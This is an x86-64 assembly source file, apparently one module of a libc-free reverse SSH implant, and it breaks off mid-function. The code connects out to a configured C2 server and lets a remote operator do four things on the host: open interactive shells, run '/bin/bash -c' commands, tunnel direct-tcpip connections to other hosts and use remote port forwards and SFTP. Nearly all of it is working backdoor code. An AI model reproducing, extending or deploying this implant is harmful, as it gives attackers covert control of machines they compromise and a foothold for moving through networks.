; ssh_client.asm - Client-side orchestration for SSH server
; Connects to C2, serves operator sessions through forwarded channels
; Pure x86-64 Linux syscalls, no libc

%include "ssh.inc"
%include "syscall.inc"

; External functions
extern net_connect
extern ssh_send_packet_enc
extern ssh_recv_packet_enc
extern ssh_channel_accept
extern ssh_channel_send_data
extern ssh_channel_send_eof_close
extern ssh_channel_table_init
extern ssh_channel_alloc
extern ssh_channel_free
extern ssh_channel_find_by_local_id
extern encode_uint32
extern encode_string
extern decode_uint32
extern ssh_pty_alloc
extern ssh_pty_spawn_shell
extern ssh_pty_spawn_exec
extern ssh_pty_spawn_exec_pipe
extern ssh_pty_relay
extern stack_probe
extern ssh_forward_open
extern net_connect_ip4
extern net_accept
extern ssh_sftp_dispatch
extern ssh_sftp_process_one
extern ssh_sftp_init_handles

; Remote forwarding (ssh -R)
extern ssh_remote_fwd_init
extern ssh_remote_fwd_handle_global_request
extern ssh_remote_fwd_build_channel_open
extern ssh_remote_fwd_cleanup
extern remote_fwd_table
extern remote_fwd_count

; Forward table entry layout (must match ssh_remote_forward.asm)
%define FWD_LISTEN_FD    0
%define FWD_PORT         4
%define FWD_ACTIVE       8
%define FWD_ENTRY_SIZE   16
%define MAX_REMOTE_FWDS  4

; Config symbols (from config.inc or test harness)
extern server_ip
extern server_port

; SSH state structure offsets (must match ssh_transport.asm)
%define SSH_STATE_K1_C2S     0
%define SSH_STATE_K2_C2S     32
%define SSH_STATE_SEQ_C2S    64
%define SSH_STATE_K1_S2C     68
%define SSH_STATE_K2_S2C     100
%define SSH_STATE_SEQ_S2C    132
%define SSH_STATE_SESSION_ID 136
%define SSH_STATE_ROLE       168
%define SSH_STATE_SIZE       176

section .text

; ============================================================================
; ssh_client_connect() -> rax=sock_fd or -1
;
; Connects to C2 IP:PORT from config. Tail-calls net_connect.
; ============================================================================
global ssh_client_connect
ssh_client_connect:
    mov edi, [rel server_ip]            ; IP in network byte order
    movzx esi, word [rel server_port]   ; port in network byte order
    jmp net_connect                  ; tail-call


; ============================================================================
; ssh_client_serve_forwarded(edi=sock_fd, rsi=state_ptr, rdx=chan_state_ptr)
;     -> rax=0 or -1
;
; Serves one operator session on an already-accepted channel.
; Receives encrypted packets directly, parses channel messages:
;   MSG 93 (WINDOW_ADJUST): update remote window
;   MSG 94 (DATA): write to PTY master (after shell started)
;   MSG 96 (EOF): close
;   MSG 97 (CLOSE): close
;   MSG 98 (REQUEST): parse request type, handle pty-req/shell/exec
;   MSG 99/100 (SUCCESS/FAILURE): ignore
;
; Flow:
;   1. Loop receiving channel messages
;   2. On "pty-req": note terminal size (ignored for v1, just count)
;   3. On "shell": allocate PTY, spawn shell, enter relay
;   4. On "exec": allocate PTY, spawn exec, enter relay
;   5. When relay finishes, return 0
; ============================================================================
global ssh_client_serve_forwarded
ssh_client_serve_forwarded:
    push rbx
    push r12
    push r13
    push r14
    push r15
    push rbp
    mov rax, 4200
    call stack_probe
    sub rsp, 4200
    ; Layout:
    ;   [rsp + 0]     recv buffer (1024 bytes)
    ;   [rsp + 1024]  send buffer (512 bytes)
    ;   [rsp + 1536]  master_fd (4 bytes)
    ;   [rsp + 1540]  slave_fd (4 bytes)
    ;   [rsp + 1544]  pty_allocated flag (4 bytes)
    ;   [rsp + 1548]  cmd buffer for exec (4096 bytes) -- up to rsp+5644
    ;   We have 4200, so cmd buffer is rsp+1548..rsp+4200 = 2652 bytes

    mov r12d, edi               ; sock_fd
    mov r13, rsi                ; state_ptr
    mov r14, rdx                ; chan_state_ptr
    mov dword [rsp + 1544], 0   ; pty_allocated = false

.serve_loop:
    ; Receive next encrypted packet
    mov edi, r12d
    lea rsi, [rsp]              ; recv buffer
    mov edx, 1024
    mov rcx, r13                ; state_ptr
    call ssh_recv_packet_enc
    cmp rax, 0
    jle .serve_fail

    ; rax = payload length, payload at [rsp]
    movzx eax, byte [rsp]      ; message type

    cmp al, SSH_MSG_CHANNEL_WINDOW_ADJUST
    je .serve_window_adjust
    cmp al, SSH_MSG_CHANNEL_DATA
    je .serve_data
    cmp al, SSH_MSG_CHANNEL_EOF
    je .serve_close
    cmp al, SSH_MSG_CHANNEL_CLOSE
    je .serve_close
    cmp al, SSH_MSG_CHANNEL_REQUEST
    je .serve_request
    cmp al, SSH_MSG_CHANNEL_SUCCESS
    je .serve_loop              ; ignore
    cmp al, SSH_MSG_CHANNEL_FAILURE
    je .serve_loop              ; ignore

    ; Unknown message - ignore and continue
    jmp .serve_loop

.serve_window_adjust:
    ; Parse: [byte 93][uint32 recipient][uint32 bytes_to_add]
    lea rdi, [rsp + 5]         ; skip msg_type(1) + recipient(4)
    call decode_uint32          ; eax = bytes_to_add
    add [r14 + CHAN_STATE_REMOTE_WINDOW], eax
    jmp .serve_loop

.serve_data:
    ; Parse: [byte 94][uint32 recipient][string data]
    ; If PTY not started yet, ignore
    cmp dword [rsp + 1544], 0
    je .serve_loop

    ; Get data length and pointer
    lea rdi, [rsp + 5]         ; data string at offset 5
    call decode_uint32          ; eax = data_len
    mov ebx, eax

    ; Write data to PTY master
    mov eax, SYS_WRITE
    mov edi, [rsp + 1536]      ; master_fd
    lea rsi, [rsp + 9]         ; data bytes start at offset 9
    mov edx, ebx
    syscall

    ; Decrement local window
    sub [r14 + CHAN_STATE_LOCAL_WINDOW], ebx

    jmp .serve_loop

.serve_close:
    ; Channel EOF or CLOSE received
    ; If PTY is running, this will be handled by relay loop exit
    ; For now, just return success
    xor eax, eax
    jmp .serve_done

.serve_request:
    ; Parse: [byte 98][uint32 recipient][string request_type][byte want_reply]...
    ; Skip msg_type(1) + recipient(4) = offset 5
    lea rdi, [rsp + 5]
    call decode_uint32          ; eax = request_type string length
    mov ebx, eax                ; save req_type_len

    ; Request type string is at offset 9
    ; Compare against known types

    ; Check "pty-req" (7 bytes)
    cmp ebx, 7
    jne .check_shell
    cmp dword [rsp + 9], 'pty-'
    jne .check_shell
    cmp word [rsp + 13], 'eq'
    jne .check_shell_3
    cmp byte [rsp + 15], 'r'
    jne .check_shell_3
    ; Matched "pty-req" -- but wait, check byte order
    ; Memory: 'p','t','y','-','r','e','q' at offsets 9..15
    ; dword at [rsp+9] = 'p'|'t'<<8|'y'<<16|'-'<<24 on LE
    ; Let me just compare bytes properly
    cmp byte [rsp + 9], 'p'
    jne .check_shell
    cmp byte [rsp + 10], 't'
    jne .check_shell
    cmp byte [rsp + 11], 'y'
    jne .check_shell
    cmp byte [rsp + 12], '-'
    jne .check_shell
    cmp byte [rsp + 13], 'r'
    jne .check_shell
    cmp byte [rsp + 14], 'e'
    jne .check_shell
    cmp byte [rsp + 15], 'q'
    jne .check_shell
    jmp .handle_pty_req

.check_shell_3:
.check_shell:
    ; Check "shell" (5 bytes)
    cmp ebx, 5
    jne .check_exec
    cmp byte [rsp + 9], 's'
    jne .check_exec
    cmp byte [rsp + 10], 'h'
    jne .check_exec
    cmp byte [rsp + 11], 'e'
    jne .check_exec
    cmp byte [rsp + 12], 'l'
    jne .check_exec
    cmp byte [rsp + 13], 'l'
    jne .check_exec
    jmp .handle_shell

.check_exec:
    ; Check "exec" (4 bytes)
    cmp ebx, 4
    jne .handle_unknown_request
    cmp byte [rsp + 9], 'e'
    jne .handle_unknown_request
    cmp byte [rsp + 10], 'x'
    jne .handle_unknown_request
    cmp byte [rsp + 11], 'e'
    jne .handle_unknown_request
    cmp byte [rsp + 12], 'c'
    jne .handle_unknown_request
    jmp .handle_exec

.handle_unknown_request:
    ; Send CHANNEL_FAILURE for unknown requests if want_reply is set
    ; want_reply is at offset 9 + req_type_len
    lea ecx, [ebx + 9]         ; offset of want_reply byte
    movzx eax, byte [rsp + rcx]
    test al, al
    jz .serve_loop              ; want_reply = false, just continue

    ; Send CHANNEL_FAILURE
    mov byte [rsp + 1024], SSH_MSG_CHANNEL_FAILURE
    lea rdi, [rsp + 1025]
    mov esi, [r14 + CHAN_STATE_REMOTE_ID]
    call encode_uint32

    mov edi, r12d
    lea rsi, [rsp + 1024]
    mov edx, 5
    mov rcx, r13
    call ssh_send_packet_enc

    jmp .serve_loop

.handle_pty_req:
    ; pty-req: just note we got it. want_reply at offset 9+7=16
    ; Send CHANNEL_SUCCESS if want_reply
    movzx eax, byte [rsp + 16]
    test al, al
    jz .serve_loop

    ; Send CHANNEL_SUCCESS
    mov byte [rsp + 1024], SSH_MSG_CHANNEL_SUCCESS
    lea rdi, [rsp + 1025]
    mov esi, [r14 + CHAN_STATE_REMOTE_ID]
    call encode_uint32

    mov edi, r12d
    lea rsi, [rsp + 1024]
    mov edx, 5
    mov rcx, r13
    call ssh_send_packet_enc

    jmp .serve_loop

.handle_shell:
    ; shell request: allocate PTY, spawn shell, enter relay
    ; want_reply at offset 9+5=14
    movzx ebp, byte [rsp + 14]

    ; Send CHANNEL_SUCCESS if want_reply (before starting PTY)
    test ebp, ebp
    jz .shell_alloc_pty

    mov byte [rsp + 1024], SSH_MSG_CHANNEL_SUCCESS
    lea rdi, [rsp + 1025]
    mov esi, [r14 + CHAN_STATE_REMOTE_ID]
    call encode_uint32

    mov edi, r12d
    lea rsi, [rsp + 1024]
    mov edx, 5
    mov rcx, r13
    call ssh_send_packet_enc

.shell_alloc_pty:
    ; Allocate PTY
    lea rdi, [rsp + 1536]      ; &master_fd
    lea rsi, [rsp + 1540]      ; &slave_fd
    call ssh_pty_alloc
    test rax, rax
    jnz .serve_fail

    mov dword [rsp + 1544], 1  ; pty_allocated = true

    ; Spawn shell
    mov edi, [rsp + 1536]      ; master_fd
    mov esi, [rsp + 1540]      ; slave_fd
    call ssh_pty_spawn_shell
    cmp rax, 0
    jle .serve_fail

    mov r15d, eax               ; child_pid

    ; Enter relay loop (this blocks until session ends)
    mov edi, r12d               ; sock_fd
    mov rsi, r13                ; state_ptr
    mov rdx, r14                ; chan_state_ptr
    mov ecx, [rsp + 1536]      ; master_fd
    mov r8d, r15d               ; child_pid
    call ssh_pty_relay

    ; Relay finished
    xor eax, eax
    jmp .serve_done

.handle_exec:
    ; exec request: parse command, allocate PTY, spawn exec, enter relay
    ; Layout after "exec": [want_reply(1)][string command]
    ; want_reply at offset 9+4=13
    movzx ebp, byte [rsp + 13]

    ; Command string at offset 14: [uint32 len][data]
    lea rdi, [rsp + 14]
    call decode_uint32          ; eax = command length
    mov ebx, eax                ; save cmd_len

    ; Send CHANNEL_SUCCESS if want_reply
    test ebp, ebp
    jz .exec_alloc_pty

    mov byte [rsp + 1024], SSH_MSG_CHANNEL_SUCCESS
    lea rdi, [rsp + 1025]
    mov esi, [r14 + CHAN_STATE_REMOTE_ID]
    call encode_uint32

    mov edi, r12d
    lea rsi, [rsp + 1024]
    mov edx, 5
    mov rcx, r13
    call ssh_send_packet_enc

.exec_alloc_pty:
    ; Allocate PTY
    lea rdi, [rsp + 1536]      ; &master_fd
    lea rsi, [rsp + 1540]      ; &slave_fd
    call ssh_pty_alloc
    test rax, rax
    jnz .serve_fail

    mov dword [rsp + 1544], 1  ; pty_allocated = true

    ; Spawn exec: /bin/bash -c <cmd>
    ; cmd data starts at offset 18 in recv buffer
    mov edi, [rsp + 1536]      ; master_fd
    mov esi, [rsp + 1540]      ; slave_fd
    lea rdx, [rsp + 18]        ; cmd ptr
    mov ecx, ebx                ; cmd_len
    call ssh_pty_spawn_exec
    cmp rax, 0
    jle .serve_fail

    mov r15d, eax               ; child_pid

    ; Enter relay loop
    mov edi, r12d               ; sock_fd
    mov rsi, r13                ; state_ptr
    mov rdx, r14                ; chan_state_ptr
    mov ecx, [rsp + 1536]      ; master_fd
    mov r8d, r15d               ; child_pid
    call ssh_pty_relay

    xor eax, eax
    jmp .serve_done

.serve_fail:
    mov rax, -1

.serve_done:
    add rsp, 4200
    pop rbp
    pop r15
    pop r14
    pop r13
    pop r12
    pop rbx
    ret


; ============================================================================
; ssh_client_event_loop(edi=sock_fd, rsi=state_ptr) -> never returns (until
;     connection drops)
;
; Main event loop: accept channel open requests, serve each session.
; Single-threaded v1: handles one session at a time.
; ============================================================================
global ssh_client_event_loop
ssh_client_event_loop:
    push rbx
    push r12
    push r13
    push r14
    sub rsp, 48                 ; chan_state (CHAN_STATE_SIZE=48)

    mov r12d, edi               ; sock_fd
    mov r13, rsi                ; state_ptr

.event_accept_loop:
    ; Zero chan_state
    lea rdi, [rsp]
    xor eax, eax
    mov ecx, CHAN_STATE_SIZE
    rep stosb

    ; Accept a new channel
    mov edi, r12d
    mov rsi, r13
    lea rdx, [rsp]              ; chan_state on stack
    call ssh_channel_accept
    test rax, rax
    jnz .event_loop_exit        ; accept failed -> connection dropped

    ; Serve the forwarded session
    mov edi, r12d
    mov rsi, r13
    lea rdx, [rsp]              ; chan_state
    call ssh_client_serve_forwarded

    ; Session ended, loop back to accept next
    jmp .event_accept_loop

.event_loop_exit:
    add rsp, 48
    pop r14
    pop r13
    pop r12
    pop rbx
    ret


; ============================================================================
; ssh_client_event_loop_v2(edi=sock_fd, rsi=state_ptr, rdx=chan_table_ptr)
;
; Unified poll-based event loop for multiple concurrent channels.
; Handles up to MAX_CHANNELS (8) concurrent sessions.
;
; Stack frame layout (all offsets pre-computed):
;   [rsp + 0]       : recv buffer (32896 bytes)
;   [rsp + 32896]   : send/work buffer (1024 bytes)
;   [rsp + 33920]   : pollfd array (104 bytes = 13*8: 1 ssh + 8 chan + 4 fwd)
;   [rsp + 34024]   : waitpid status (8 bytes)
;   [rsp + 34032]   : read buffer for channel fds (4096 bytes)
;   [rsp + 38128]   : master_fd temp (4 bytes)
;   [rsp + 38132]   : slave_fd temp (4 bytes)
;   Total frame: 38144 (16-byte aligned)
; ============================================================================
%define WNOHANG_FLAG    1

; Channel constants (same as ssh_channel.asm)
%define V2_INITIAL_WINDOW   0x200000    ; 2MB
%define V2_MAX_PACKET_DATA  0x8000      ; 32KB

global ssh_client_event_loop_v2
ssh_client_event_loop_v2:
    push rbx
    push r12
    push r13
    push r14
    push r15
    push rbp
    mov rax, 38144
    call stack_probe
    sub rsp, 38144

    mov r12d, edi               ; sock_fd
    mov r13, rsi                ; state_ptr
    mov r14, rdx                ; chan_table_ptr

    ; Initialize remote forward table
    call ssh_remote_fwd_init

    ; ================================================================
    ; Main poll loop
    ; ================================================================
.v2_loop:
    ; --- Step 1: Build pollfd array ---
    ; pollfd[0] = {ssh_sock_fd, POLLIN, 0}
    lea rbp, [rsp + 33920]
    mov dword [rbp], r12d       ; fd = ssh_sock_fd
    mov word [rbp + 4], POLLIN  ; events
    mov word [rbp + 6], 0       ; revents

    ; Count of fds in pollfd array (starts at 1 for ssh_sock)
    mov r15d, 1                 ; nfds = 1

    ; Walk channel table, add active channel fds
    xor ecx, ecx               ; channel index
.v2_build_poll:
    cmp ecx, MAX_CHANNELS
    jge .v2_do_poll

    ; Calculate channel slot pointer
    mov eax, ecx
    imul eax, CHAN_STATE_SIZE
    lea rbx, [r14 + rax]       ; chan_state_ptr for this slot

    ; Skip unused channels
    cmp dword [rbx + CHAN_STATE_TYPE], CHAN_TYPE_UNUSED
    je .v2_build_poll_next

    ; Check if channel has an active fd (CHAN_STATE_FD > 0)
    mov eax, [rbx + CHAN_STATE_FD]
    cmp eax, 0
    jle .v2_build_poll_next

    ; Check if channel has a running child (for session channels)
    ; or is a direct-tcp channel (poll only if CONFIRM received, i.e. remote_window > 0)
    cmp dword [rbx + CHAN_STATE_TYPE], CHAN_TYPE_SESSION
    jne .v2_check_direct_tcp_ready
    ; For session channels, only poll if child_pid > 0
    cmp dword [rbx + CHAN_STATE_CHILD_PID], 0
    jle .v2_build_poll_next
    jmp .v2_add_poll_fd

.v2_check_direct_tcp_ready:
    ; For direct-tcp channels, only poll if CHANNEL_OPEN_CONFIRM has arrived
    ; (remote_window > 0 means confirm was received and window was set)
    cmp dword [rbx + CHAN_STATE_REMOTE_WINDOW], 0
    jle .v2_build_poll_next

.v2_add_poll_fd:
    ; Add to pollfd array
    mov eax, r15d
    shl eax, 3                  ; * 8 (sizeof pollfd)
    lea rdi, [rbp + rax]
    mov eax, [rbx + CHAN_STATE_FD]
    mov dword [rdi], eax        ; fd
    mov word [rdi + 4], POLLIN  ; events
    mov word [rdi + 6], 0       ; revents
    inc r15d

.v2_build_poll_next:
    inc ecx
    jmp .v2_build_poll

.v2_do_poll:
    ; --- Step 1b: Add remote forward listen fds to poll array ---
    cmp dword [rel remote_fwd_count], 0
    je .v2_do_poll_syscall

    lea rdi, [rel remote_fwd_table]
    xor ecx, ecx               ; forward index
.v2_build_fwd_poll:
    cmp ecx, MAX_REMOTE_FWDS
    jge .v2_do_poll_syscall

    cmp dword [rdi + FWD_ACTIVE], 1
    jne .v2_build_fwd_poll_next

    ; Add listen_fd to pollfd array
    mov eax, r15d
    shl eax, 3                  ; * 8 (sizeof pollfd)
    lea rbx, [rbp + rax]
    mov eax, [rdi + FWD_LISTEN_FD]
    mov dword [rbx], eax        ; fd
    mov word [rbx + 4], POLLIN  ; events
    mov word [rbx + 6], 0       ; revents
    inc r15d

.v2_build_fwd_poll_next:
    add rdi, FWD_ENTRY_SIZE
    inc ecx
    jmp .v2_build_fwd_poll

.v2_do_poll_syscall:
    ; --- Step 2: poll(pollfds, nfds, 100ms) ---
    mov eax, SYS_POLL
    lea rdi, [rsp + 33920]
    mov esi, r15d               ; nfds
    mov edx, 100                ; 100ms timeout
    syscall

    ; --- Step 3: Check ssh_sock_fd for incoming SSH packets ---
    lea rbp, [rsp + 33920]
    test word [rbp + 6], POLLIN
    jz .v2_check_channel_fds

    ; Receive encrypted packet from SSH socket
    mov edi, r12d
    lea rsi, [rsp]              ; recv buffer
    mov edx, 32896
    mov rcx, r13                ; state_ptr
    call ssh_recv_packet_enc
    cmp rax, 0
    jle .v2_exit                ; connection dropped

    ; Dispatch by message type
    movzx eax, byte [rsp]

    cmp al, SSH_MSG_GLOBAL_REQUEST
    je .v2_handle_global_request
    cmp al, SSH_MSG_CHANNEL_OPEN
    je .v2_handle_channel_open
    cmp al, SSH_MSG_CHANNEL_OPEN_CONFIRM
    je .v2_handle_channel_open_confirm
    cmp al, SSH_MSG_CHANNEL_DATA
    je .v2_handle_channel_data
    cmp al, SSH_MSG_CHANNEL_WINDOW_ADJUST
    je .v2_handle_window_adjust
    cmp al, SSH_MSG_CHANNEL_REQUEST
    je .v2_handle_channel_request
    cmp al, SSH_MSG_CHANNEL_EOF
    je .v2_handle_channel_eof_close
    cmp al, SSH_MSG_CHANNEL_CLOSE
    je .v2_handle_channel_eof_close
    cmp al, SSH_MSG_CHANNEL_SUCCESS
    je .v2_check_channel_fds    ; ignore
    cmp al, SSH_MSG_CHANNEL_FAILURE
    je .v2_check_channel_fds    ; ignore

    ; Unknown message, ignore
    jmp .v2_check_channel_fds

    ; ================================================================
    ; GLOBAL_REQUEST handler (SSH_MSG_GLOBAL_REQUEST = 80)
    ; Delegates to ssh_remote_fwd_handle_global_request
    ; ================================================================
.v2_handle_global_request:
    ; Payload is at [rsp], length in rax from recv (but we didn't save it)
    ; The full payload is in the recv buffer at [rsp]
    ; Pass payload ptr, generous length, sock_fd, state_ptr
    lea rdi, [rsp]             ; payload ptr
    mov esi, 32896             ; payload_len (generous upper bound)
    mov edx, r12d              ; sock_fd
    mov rcx, r13               ; state_ptr
    call ssh_remote_fwd_handle_global_request
    jmp .v2_check_channel_fds

    ; ================================================================
    ; CHANNEL_OPEN_CONFIRM handler (SSH_MSG_CHANNEL_OPEN_CONFIRM = 91)
    ; For channels WE opened (forwarded-tcpip), populate remote_id etc.
    ; ================================================================
.v2_handle_channel_open_confirm:
    ; Parse: [byte 91][uint32 recipient=our_local_id][uint32 sender=remote_id]
    ;        [uint32 window][uint32 maxpkt]
    lea rdi, [rsp + 1]
    call decode_uint32         ; eax = recipient (our local_id)
    mov ebx, eax

    ; Find channel by local_id
    mov rdi, r14
    mov esi, ebx
    call ssh_channel_find_by_local_id
    test rax, rax
    jz .v2_check_channel_fds   ; channel not found, ignore

    mov rbx, rax               ; rbx = chan_state_ptr

    ; sender = remote_id at offset 5
    lea rdi, [rsp + 5]
    call decode_uint32
    mov [rbx + CHAN_STATE_REMOTE_ID], eax

    ; window at offset 9
    lea rdi, [rsp + 9]
    call decode_uint32
    mov [rbx + CHAN_STATE_REMOTE_WINDOW], eax

    ; maxpkt at offset 13
    lea rdi, [rsp + 13]
    call decode_uint32
    mov [rbx + CHAN_STATE_REMOTE_MAXPKT], eax

    jmp .v2_check_channel_fds

    ; ================================================================
    ; CHANNEL_OPEN handler
    ; ================================================================
.v2_handle_channel_open:
    ; Parse: [byte 90][string channel_type][uint32 sender][uint32 window][uint32 maxpkt]
    ;        [... type-specific data for direct-tcpip ...]
    ; Get channel type string length
    lea rdi, [rsp + 1]
    call decode_uint32          ; eax = type string length
    mov ebx, eax                ; save type_len

    ; Channel type string is at offset 5
    ; Check if type is "direct-tcpip" (12 bytes)
    cmp ebx, 12
    jne .v2_chanopen_check_session

    ; Compare "direct-tcpip" byte by byte at [rsp + 5]
    cmp byte [rsp + 5], 'd'
    jne .v2_chanopen_check_session
    cmp byte [rsp + 6], 'i'
    jne .v2_chanopen_check_session
    cmp byte [rsp + 7], 'r'
    jne .v2_chanopen_check_session
    cmp byte [rsp + 8], 'e'
    jne .v2_chanopen_check_session
    cmp byte [rsp + 9], 'c'
    jne .v2_chanopen_check_session
    cmp byte [rsp + 10], 't'
    jne .v2_chanopen_check_session
    cmp byte [rsp + 11], '-'
    jne .v2_chanopen_check_session
    cmp byte [rsp + 12], 't'
    jne .v2_chanopen_check_session
    cmp byte [rsp + 13], 'c'
    jne .v2_chanopen_check_session
    cmp byte [rsp + 14], 'p'
    jne .v2_chanopen_check_session
    cmp byte [rsp + 15], 'i'
    jne .v2_chanopen_check_session
    cmp byte [rsp + 16], 'p'
    jne .v2_chanopen_check_session
    jmp .v2_handle_direct_tcpip

.v2_chanopen_check_session:
    ; Not direct-tcpip — handle as session (existing behavior)

    ; sender_channel at offset 5 + type_len
    lea ecx, [ebx + 5]
    lea rdi, [rsp + rcx]
    call decode_uint32
    mov [rsp + 34024], eax  ; save remote sender_channel temporarily
    lea ecx, [ebx + 9]

    ; window at offset 5 + type_len + 4
    lea rdi, [rsp + rcx]
    call decode_uint32
    push rax                    ; save remote_window
    lea ecx, [ebx + 13]

    ; maxpkt at offset 5 + type_len + 8
    lea rdi, [rsp + rcx]
    call decode_uint32
    ; eax = remote_maxpkt, [rsp] = remote_window (pushed)

    ; Allocate a channel slot
    push rax                    ; save remote_maxpkt
    mov rdi, r14                ; chan_table_ptr
    call ssh_channel_alloc
    test rax, rax
    jz .v2_channel_open_reject

    mov rbx, rax                ; rbx = new chan_state_ptr

    ; Pop saved values
    pop rax                     ; remote_maxpkt
    mov [rbx + CHAN_STATE_REMOTE_MAXPKT], eax
    pop rax                     ; remote_window
    mov [rbx + CHAN_STATE_REMOTE_WINDOW], eax

    ; Set remote_id from saved sender_channel
    mov eax, [rsp + 34024]
    mov [rbx + CHAN_STATE_REMOTE_ID], eax

    ; Set local window + maxpkt
    mov dword [rbx + CHAN_STATE_LOCAL_WINDOW], V2_INITIAL_WINDOW
    mov dword [rbx + CHAN_STATE_LOCAL_MAXPKT], V2_MAX_PACKET_DATA
    mov dword [rbx + CHAN_STATE_TYPE], CHAN_TYPE_SESSION

    ; Send CHANNEL_OPEN_CONFIRMATION
    ; [byte 91][uint32 recipient=remote_id][uint32 sender=local_id]
    ; [uint32 window=2MB][uint32 maxpkt=32KB]
    lea rbp, [rsp + 32896]
    mov byte [rbp], SSH_MSG_CHANNEL_OPEN_CONFIRM

    lea rdi, [rbp + 1]
    mov esi, [rbx + CHAN_STATE_REMOTE_ID]
    call encode_uint32

    lea rdi, [rbp + 5]
    mov esi, [rbx + CHAN_STATE_LOCAL_ID]
    call encode_uint32

    lea rdi, [rbp + 9]
    mov esi, V2_INITIAL_WINDOW
    call encode_uint32

    lea rdi, [rbp + 13]
    mov esi, V2_MAX_PACKET_DATA
    call encode_uint32

    mov edi, r12d
    lea rsi, [rsp + 32896]
    mov edx, 17                 ; 1 + 4*4
    mov rcx, r13
    call ssh_send_packet_enc

    jmp .v2_check_channel_fds

    ; ================================================================
    ; direct-tcpip CHANNEL_OPEN handler
    ; ================================================================
.v2_handle_direct_tcpip:
    ; Parse standard header fields (type_len=12 for "direct-tcpip"):
    ; sender_channel at offset 5 + 12 = 17
    lea rdi, [rsp + 17]
    call decode_uint32
    mov [rsp + 34024], eax  ; save remote sender_channel

    ; window at offset 21
    lea rdi, [rsp + 21]
    call decode_uint32
    push rax                    ; save remote_window

    ; maxpkt at offset 25
    lea rdi, [rsp + 25]
    call decode_uint32
    push rax                    ; save remote_maxpkt

    ; Type-specific data starts at offset 29:
    ;   [string host_to_connect][uint32 port_to_connect]
    ;   [string originator_ip][uint32 originator_port]
    ; Call ssh_forward_open(payload_ptr=rsp+29, payload_len=remaining)
    lea rdi, [rsp + 29 + 16]   ; +16 for 2 pushes
    ; Calculate remaining length from recv buffer
    ; We don't have the total packet length easily, use a generous bound
    mov esi, 512                ; generous upper bound for forward payload
    call ssh_forward_open
    ; rax = tcp_sock_fd or -1

    cmp rax, -1
    je .v2_direct_tcpip_connect_fail

    mov ebp, eax                ; save tcp_sock_fd

    ; Allocate a channel slot
    mov rdi, r14                ; chan_table_ptr
    call ssh_channel_alloc
    test rax, rax
    jz .v2_direct_tcpip_alloc_fail

    mov rbx, rax                ; rbx = new chan_state_ptr

    ; Pop saved values and configure channel
    pop rax                     ; remote_maxpkt
    mov [rbx + CHAN_STATE_REMOTE_MAXPKT], eax
    pop rax                     ; remote_window
    mov [rbx + CHAN_STATE_REMOTE_WINDOW], eax

    ; Set remote_id
    mov eax, [rsp + 34024]
    mov [rbx + CHAN_STATE_REMOTE_ID], eax

    ; Set channel type to DIRECT_TCP, store TCP socket fd
    mov dword [rbx + CHAN_STATE_LOCAL_WINDOW], V2_INITIAL_WINDOW
    mov dword [rbx + CHAN_STATE_LOCAL_MAXPKT], V2_MAX_PACKET_DATA
    mov dword [rbx + CHAN_STATE_TYPE], CHAN_TYPE_DIRECT_TCP
    mov [rbx + CHAN_STATE_FD], ebp

    ; Send CHANNEL_OPEN_CONFIRMATION
    lea rbp, [rsp + 32896]
    mov byte [rbp], SSH_MSG_CHANNEL_OPEN_CONFIRM

    lea rdi, [rbp + 1]
    mov esi, [rbx + CHAN_STATE_REMOTE_ID]
    call encode_uint32

    lea rdi, [rbp + 5]
    mov esi, [rbx + CHAN_STATE_LOCAL_ID]
    call encode_uint32

    lea rdi, [rbp + 9]
    mov esi, V2_INITIAL_WINDOW
    call encode_uint32

    lea rdi, [rbp + 13]
    mov esi, V2_MAX_PACKET_DATA
    call encode_uint32

    mov edi, r12d
    lea rsi, [rsp + 32896]
    mov edx, 17
    mov rcx, r13
    call ssh_send_packet_enc

    jmp .v2_check_channel_fds

.v2_direct_tcpip_alloc_fail:
    ; Channel table full — close the tcp socket we opened
    mov eax, SYS_CLOSE
    mov edi, ebp
    syscall
    pop rax                     ; discard remote_maxpkt
    pop rax                     ; discard remote_window
    jmp .v2_direct_tcpip_send_failure

.v2_direct_tcpip_connect_fail:
    ; Connection to target failed
    pop rax                     ; discard remote_maxpkt
    pop rax                     ; discard remote_window

.v2_direct_tcpip_send_failure:
    ; Send CHANNEL_OPEN_FAILURE (92)
    ; [byte 92][uint32 recipient][uint32 reason=2 CONNECT_FAILED][string ""][string ""]
    lea rbp, [rsp + 32896]
    mov byte [rbp], SSH_MSG_CHANNEL_OPEN_FAILURE

    lea rdi, [rbp + 1]
    mov esi, [rsp + 34024]  ; recipient = remote sender
    call encode_uint32

    ; reason code = 2 (SSH_OPEN_CONNECT_FAILED)
    lea rdi, [rbp + 5]
    mov esi, 2
    call encode_uint32

    ; description = "" (empty string)
    lea rdi, [rbp + 9]
    xor esi, esi
    call encode_uint32

    ; language tag = "" (empty string)
    lea rdi, [rbp + 13]
    xor esi, esi
    call encode_uint32

    mov edi, r12d
    lea rsi, [rsp + 32896]
    mov edx, 17
    mov rcx, r13
    call ssh_send_packet_enc

    jmp .v2_check_channel_fds

.v2_channel_open_reject:
    ; Table full — send CHANNEL_OPEN_FAILURE
    pop rax                     ; discard remote_maxpkt
    pop rax                     ; discard remote_window
    lea rbp, [rsp + 32896]
    mov byte [rbp], SSH_MSG_CHANNEL_OPEN_FAILURE

    lea rdi, [rbp + 1]
    mov esi, [rsp + 34024]  ; recipient = remote sender
    call encode_uint32

    ; reason code = 4 (resource shortage)
    lea rdi, [rbp + 5]
    mov esi, 4
    call encode_uint32

    ; description = "" (empty string)
    lea rdi, [rbp + 9]
    xor esi, esi
    call encode_uint32

    ; language tag = "" (empty string)
    lea rdi, [rbp + 13]
    xor esi, esi
    call encode_uint32

    mov edi, r12d
    lea rsi, [rsp + 32896]
    mov edx, 17
    mov rcx, r13
    call ssh_send_packet_enc

    jmp .v2_check_channel_fds

    ; ================================================================
    ; CHANNEL_DATA handler
    ; ================================================================
.v2_handle_channel_data:
    ; Parse: [byte 94][uint32 recipient_channel][string data]
    lea rdi, [rsp + 1]
    call decode_uint32          ; eax = recipient_channel (our local_id)
    mov ebx, eax                ; save local_id

    ; Find channel by local_id
    mov rdi, r14
    mov esi, ebx
    call ssh_channel_find_by_local_id
    test rax, rax
    jz .v2_check_channel_fds    ; channel not found, ignore

    mov rbx, rax                ; rbx = chan_state_ptr

    ; Get data
    lea rdi, [rsp + 5]
    call decode_uint32          ; eax = data_len
    mov ebp, eax                ; save data_len

    ; Check channel type — SFTP channels process data inline
    cmp dword [rbx + CHAN_STATE_TYPE], CHAN_TYPE_SFTP
    je .v2_handle_sftp_data

    ; Determine write fd based on channel type
    cmp dword [rbx + CHAN_STATE_TYPE], CHAN_TYPE_SESSION
    jne .v2_data_write_fd
